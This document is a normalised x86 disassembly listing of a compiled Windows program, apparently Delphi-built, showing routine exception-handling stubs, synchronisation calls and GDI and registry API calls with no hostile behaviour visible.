sub_41c2cd
mov esp ebp
pop ebp
retn
sub_41c370
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
retn
sub_41c3f8
mov [ eax + 0x18 ] edx
retn
sub_41c574
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_416688
retn
sub_41c5fb
jmp sub_404de4
sub_41c602
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c6b1
jmp sub_404de4
sub_41c6b8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c880
jmp sub_404de4
sub_41c8d2
jmp sub_404de4
sub_41c8f1
jmp sub_404de4
sub_41c8f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c917
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41c910
jmp sub_404de4
sub_41c917
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c9bb
jmp sub_404de4
sub_41ca43
jmp sub_404de4
sub_41ca50
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
pop ebx
retn
sub_41ca68
mov eax [ rw-data ]
call sub_41ca50
retn
sub_41caa0
push ebx
call sub_4166e4
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41ca68
sub_41cc1e
jmp sub_404de4
sub_41cc25
mov eax [ ebp - 0x4 ]
add eax 0x80
call sub_405530
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41cdd4
jmp sub_404de4
sub_41cddb
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41cef9
jmp sub_404de4
sub_41cf16
jmp sub_404de4
sub_41cf1d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d01c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41b714
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41d0e0
push ebx
mov ebx eax
mov eax ebx
call sub_41ebc0
cmp al 0x9
sete al
pop ebx
retn
sub_41d144
jmp sub_404de4
sub_41d14b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41d1a0
jmp sub_404de4
sub_41d1a7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41d250
jmp sub_404de4
sub_41d257
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d4d6
jmp sub_404b30
sub_41d502
jmp sub_404b30
sub_41d5a4
jmp sub_404b30
sub_41d647
jmp sub_404b30
sub_41d822
jmp sub_404b30
sub_41d864
jmp sub_404de4
sub_41d894
jmp sub_404de4
sub_41d89b
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d90b
jmp sub_404de4
sub_41d9e2
jmp sub_404de4
sub_41d9e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dcf0
mov dl 0x1
call sub_41caf4
retn
sub_41de31
jmp sub_404de4
sub_41de38
pop ebx
mov esp ebp
pop ebp
retn
sub_41de40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41ecd0
mov eax [ rw-data ]
call sub_41ca50
pop ebp
retn
j_sub_404c5c#2
jmp sub_404c5c
j_sub_404c5c#4
jmp sub_404c5c
sub_41e0a4
jmp sub_404de4
sub_41e0ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e18b
jmp sub_404de4
sub_41e192
mov esp ebp
pop ebp
retn
sub_41e24a
jmp sub_404de4
sub_41e251
pop ecx
pop ecx
pop ebp
retn
sub_41e564
jmp sub_404de4
sub_41e56b
pop ebx
mov esp ebp
pop ebp
retn
sub_41e812
jmp sub_404de4
sub_41e819
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_404650
retn
sub_41e835
jmp sub_404de4
sub_41e859
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_404b30
sub_41e890
jmp sub_404b30
sub_41e8cf
jmp sub_404de4
sub_41e8d6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8f8
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_405554
retn
sub_41e8f1
jmp sub_404de4
sub_41e8f8
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e981
jmp sub_404b30
sub_41e9ae
jmp sub_404de4
sub_41e9b5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e9c0
push ecx
mov edx esp
mov ecx 0x4
call sub_41d058
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41ca50
sub_41eacd
jmp sub_404de4
sub_41ead4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ebb3
jmp sub_404de4
sub_41ebba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ec10
jmp sub_404de4
sub_41ec17
pop ebx
pop ecx
pop ebp
retn
sub_41ee75
jmp sub_404de4
sub_41ee7c
pop ecx
pop ecx
pop ebp
retn
sub_41eebd
jmp sub_404de4
sub_41eec4
pop ebx
pop ecx
pop ebp
retn
sub_41ef60
jmp sub_404de4
sub_41ef67
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f015
jmp sub_404de4
sub_41f01c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f028
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_41f283
jmp sub_404de4
sub_41f28a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2af
mov eax [ ebp - 0x10 ]
call sub_404650
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_41f2a8
jmp sub_404de4
sub_41f2af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2d4
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41f2cd
jmp sub_404de4
sub_41f2d4
pop ebx
mov esp ebp
pop ebp
retn
sub_41f4fe
jmp sub_404de4
sub_41f505
pop ebx
mov esp ebp
pop ebp
retn
sub_41f558
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41b978
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41f570
test dl dl
je r-xdata
mov dl 0x8
call sub_41f708
retn
mov dl 0x9
call sub_41f708
retn
sub_41f5f8
mov dl 0x1
call sub_41f708
retn
sub_41f600
xor edx edx
call sub_41f708
retn
sub_41f6f9
jmp sub_404de4
sub_41f700
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f71c
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40f26c
sub_41f750
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41f768
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41f774
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41f768
sub_41f790
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_41f79c
push rw-data
call InterlockedIncrement
retn
sub_41f7a8
push rw-data
call InterlockedDecrement
retn
sub_41f8be
jmp sub_404b30
sub_41f8fd
jmp sub_404de4
sub_41f95a
jmp sub_404de4
sub_41f961
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f980
push rw-data
call LeaveCriticalSection
retn
sub_41f979
jmp sub_404de4
sub_41f980
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f9cd
jmp sub_404b30
sub_41fa23
jmp sub_404de4
sub_41fa2a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fade
jmp sub_404de4
sub_41fae5
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41fb78
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_41fef0
sub_41fbf2
jmp sub_404de4
sub_41fbf9
pop ebx
mov esp ebp
pop ebp
retn
sub_41fc18
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41fc2c
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_41fc18
call sub_41fec8
sub_41fd1e
jmp sub_404de4
sub_41fd25
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41fe5c
jmp sub_404de4
sub_41fe7b
jmp sub_404de4
sub_41fea2
jmp sub_404de4
sub_42008c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_420278
sub_4200ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_420100
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_420114
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f584
retn
sub_420120
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f584
retn
sub_4203dc
xor eax eax
retn
sub_4203e0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4203e8
xor eax eax
retn
sub_4203ec
retn
sub_4203f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405584
pop esi
pop ebx
retn
sub_420404
mov eax [ eax + 0x4 ]
retn
sub_420408
retn
sub_42040c
xor eax eax
retn
sub_420410
retn
sub_420414
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_420420
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_42042c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420438
retn
sub_42043c
xchg edx eax
call sub_41d8b0
retn
sub_420444
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_4204cc
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40484c
pop esi
retn
sub_4204e0
retn
sub_4205c4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405584
pop esi
pop ebx
retn
sub_420604
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_420750
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_404898
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_420768
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4207f0
retn
sub_420838
retn
sub_420870
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_420888
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_420ab4
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40484c
pop esi
pop ebx
retn
sub_4208d0
mov al 0x1
retn
sub_4208d4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4208dc
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_42098c
xor eax eax
retn
sub_420990
retn
sub_4209bc
retn
sub_420a54
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_420a68
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_419740
retn
sub_420bb3
jmp sub_404b30
sub_420bb8
mov ebx 0x1
call sub_404f40
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420c1b
jmp sub_404b30
sub_420c20
mov ebx 0x80030103
call sub_404f40
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
j_sub_404b30#8
jmp sub_404b30
sub_420ca3
mov ebx 0x80030009
call sub_404f40
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
j_sub_404b30#7
jmp sub_404b30
sub_420d06
mov ebx 0x8000ffff
call sub_404f40
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420ed7
jmp sub_404de4
sub_420ee8
jmp sub_404b30
sub_420eed
mov [ ebp - 0x4 ] 0x8000ffff
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f16
lea eax [ ebp + 0xc ]
call sub_40700c
retn
sub_420f0f
jmp sub_404de4
sub_420f16
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_420f24
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_420f30
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_420f3c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420f48
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420fb7
jmp sub_404b30
sub_420fbc
mov esi 0x8000ffff
call sub_404f40
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420fd0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_42103d
jmp sub_404de4
sub_421044
mov eax [ rw-data ]
call sub_404650
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421054
call sub_419088
retn
sub_42111c
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_4212c0
jmp sub_404de4
sub_4212c7
pop ebp
retn
sub_421558
jmp sub_404de4
sub_42155f
pop ebp
retn
sub_421658
push ebx
mov ebx eax
test ebx ebx
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx ] 0x5c
jne r-xdata
xor eax eax
pop ebx
retn
sub_4218d4
jmp sub_404de4
sub_4218db
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4219e9
jmp sub_404de4
sub_4219f0
movzx eax [ ebp - 0x6 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421bb9
jmp sub_404de4
sub_421bc0
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421cf8
jmp sub_404de4
sub_421d42
jmp sub_404de4
sub_421d49
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_421e90
jmp sub_404de4
sub_421e97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421f58
jmp sub_404de4
sub_421f5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4220e0
push ecx
mov [ esp ] ecx
push 0x4
push 0x3
lea ecx [ esp + 0x8 ]
call sub_422188
pop edx
retn
sub_422264
add esp 0xfffffff8
mov ecx esp
call sub_421f68
pop ecx
pop edx
retn
sub_4222fa
jmp sub_404de4
sub_422301
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422371
jmp sub_404de4
sub_422378
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_422457
jmp sub_404de4
sub_42245e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402f1c
retn
sub_422474
jmp sub_404de4
sub_422497
jmp sub_404de4
sub_42249e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422596
jmp sub_404de4
sub_42259d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225c2
lea eax [ ebp - 0x30 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4225bb
jmp sub_404de4
sub_4225c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422773
jmp sub_404de4
sub_42277a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42279d
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x1c ]
call sub_421804
retn
sub_422796
jmp sub_404de4
sub_42279d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call RegCloseKey
retn
sub_4227b4
jmp sub_404de4
sub_4227e3
jmp sub_404de4
sub_4227ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422814
lea eax [ ebp - 0x50 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_42280d
jmp sub_404de4
sub_422814
mov esp ebp
pop ebp
retn
sub_4228dc
jmp sub_404de4
sub_4228fa
jmp sub_404de4
sub_422960
jmp sub_404de4
sub_422967
pop ebp
retn
sub_423389
add eax 0xffffffd8
jmp sub_427530
sub_423391
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_42345e
cld
jmp [ ebp + esi * 2 + 0x75c80042 ]
sub_4238c0
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_4239a8
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_423a1c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423a28
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423b08
jmp sub_404de4
sub_423b0f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423ba0
jmp sub_404de4
sub_423c45
jmp sub_404de4
sub_423c4c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423c54
retn
sub_423cb4
jmp sub_404de4
sub_423cbb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423cc4
cmp [ edx + 0x1d ] 0x0
je r-xdata
retn
lea eax [ edx + 0x18 ]
call sub_40f944
sub_423d34
jmp sub_404de4
sub_423d3b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423de1
jmp sub_404de4
sub_423de8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424240
push 0x33
mov ecx rw-data
call sub_419348
retn
sub_424250
push 0x33
mov ecx rw-data
call sub_419308
retn
sub_424260
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_424284
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_424458
push 0x11
mov ecx rw-data
call sub_419308
retn
sub_4245a4
push ebx
mov ebx eax
mov eax ebx
call sub_424260
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42465e
jmp sub_404de4
sub_424665
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424284
retn
sub_42467b
jmp sub_404de4
sub_424694
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xc
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4246f1
jmp sub_404de4
sub_4246f8
pop ebx
pop ecx
pop ebp
retn
sub_424930
jmp sub_404de4
sub_424958
jmp sub_404de4
sub_42495f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4249cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1f
call sub_405794
pop esi
pop ebx
retn
sub_424a40
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_42499c
push eax
call MulDiv
neg eax
pop ebx
retn
sub_424a7c
mov eax [ eax + 0x10 ]
movzx edx [ eax + 0x1d ]
mov eax edx
retn
sub_424ab4
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_424ae4
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1e ]
retn
sub_424b14
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_424c33
jmp sub_404de4
sub_424c3a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424284
retn
sub_424c50
jmp sub_404de4
sub_424cc5
jmp sub_404de4
sub_424ccc
pop ebx
pop ecx
pop ebp
retn
sub_424cd0
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_424d86
jmp sub_404de4
sub_424d98
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_40484c
sub_424dac
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_424ddc
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_424eeb
jmp sub_404de4
sub_424ef2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424284
retn
sub_424f08
jmp sub_404de4
sub_424f81
jmp sub_404de4
sub_424f88
pop ebx
pop ecx
pop ebp
retn
sub_4250ba
jmp sub_404de4
sub_4250cc
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_4253d0
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_4255f8
jmp sub_404de4
sub_4255ff
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_425608
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_425640
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_42564c
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_425798
retn
sub_425865
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_42587c
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_425968
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425988
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4259a8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4259c8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
pop ebx
retn
sub_4259e0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
pop ebx
retn
sub_425a04
mov eax [ rw-data ]
call sub_4259e0
retn
sub_425a66
jmp sub_404de4
sub_425a6d
pop ecx
pop ebp
retn
sub_425b0c
jmp sub_404de4
sub_425b13
pop ebx
mov esp ebp
pop ebp
retn
sub_425be5
jmp sub_404de4
sub_425c76
jmp sub_404de4
sub_425c7d
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425d90
jmp sub_404de4
sub_425f3d
jmp sub_404de4
sub_425f44
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_42615d
jmp sub_404de4
sub_426164
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_4261fe
jmp sub_404de4
sub_4263db
jmp sub_404de4
sub_426495
jmp sub_404de4
sub_42649c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264bc
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4264b5
jmp sub_404de4
sub_4264bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42664d
jmp sub_404de4
sub_42681a
jmp sub_404de4
sub_426821
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426844
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402f1c
retn
sub_42683d
jmp sub_404de4
sub_426844
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426864
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402f1c
retn
sub_42685d
jmp sub_404de4
sub_426864
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_426870
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_4269d4
push 0x0
call sub_42696c
retn
sub_426a79
jmp sub_404de4
sub_426a80
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_426a90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_4269dc
pop ebx
pop ebp
retn 0x4
sub_426aa4
retn
sub_426aa8
test eax eax
jne r-xdata
retn
call sub_426aa4
sub_426c7d
jmp sub_404de4
sub_426ca4
jmp sub_404de4
sub_426cab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426cec
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426eb9
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_426ec2
jmp sub_404de4
j_sub_426eb9
jmp sub_426eb9
sub_426ec9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404650
retn
sub_426edf
jmp sub_404de4
sub_426ef4
xor eax eax
retn
sub_426ef8
movzx eax [ eax + 0x21 ]
retn
sub_426f48
jmp sub_404de4
sub_426f4f
pop esi
pop ecx
pop ebp
retn
sub_426f80
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_426fd7
jmp sub_404de4
sub_426fde
pop esi
pop ecx
pop ebp
retn
sub_426fe4
retn
sub_427004
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427014
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_42709e
jmp sub_404de4
sub_4270a5
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427200
jmp sub_404b30
sub_427260
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427110
mov [ rw-data ] eax
sub_427348
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4272e4
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4273f0
jmp sub_404b30
sub_427487
jmp sub_404b30
sub_427500
push ebx
mov ebx edx
call sub_427260
